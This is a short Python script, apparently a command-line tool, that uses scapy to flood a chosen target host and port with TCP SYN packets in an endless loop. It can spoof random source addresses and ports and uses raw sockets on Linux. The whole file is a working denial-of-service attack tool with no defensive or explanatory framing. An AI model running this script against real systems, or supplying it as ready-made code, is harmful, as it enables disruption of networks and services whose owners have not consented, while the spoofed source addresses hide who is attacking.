from scapy.all import IP, TCP, RandIP, RandShort, Raw, Ether, send, conf
from platform import system
from argparse import ArgumentParser

if system() == "Linux":
    from socket import socket, SOCK_RAW, AF_PACKET


def parse():
    parser = ArgumentParser()
    parser.add_argument("target", help="Target IP or hostname.")
    parser.add_argument("--dport", "-p", help="Destination port.", default=80, type=int)
    parser.add_argument("--source", "-s", help="Source IP.", default=None)
    parser.add_argument("--sport", "-P", help="Source port.", default=None, type=int)
    parser.add_argument("--data", "-d", help="Additional data", default=None)
    return parser.parse_args()


def synflood(target, dport, source, sport, data=None):
    packet = IP(dst=target, src=source) / TCP(dport=dport, sport=sport)

    if system() == "Linux":
        packet = Ether() / packet
        sock = socket(AF_PACKET, SOCK_RAW)
        sock.bind((conf.iface, 0))
        send_ = sock.send
    else:
        send_ = lambda packet: send(packet, verbose=0)

    if data:
        packet = packet / Raw(data.encode())
        
    if system() == "Linux":
        packet = bytes(packet)

    while True:
        send_(packet)


def launch():
    parser = parse()
    run = True

    while run:
        try:
            synflood(
                parser.target,
                parser.dport,
                parser.source or RandIP(),
                parser.sport or RandShort(),
                parser.data,
            )
        #except OSError:
        #    print("OSError...")
        except KeyboardInterrupt:
            run = False


if __name__ == "__main__":
    launch()
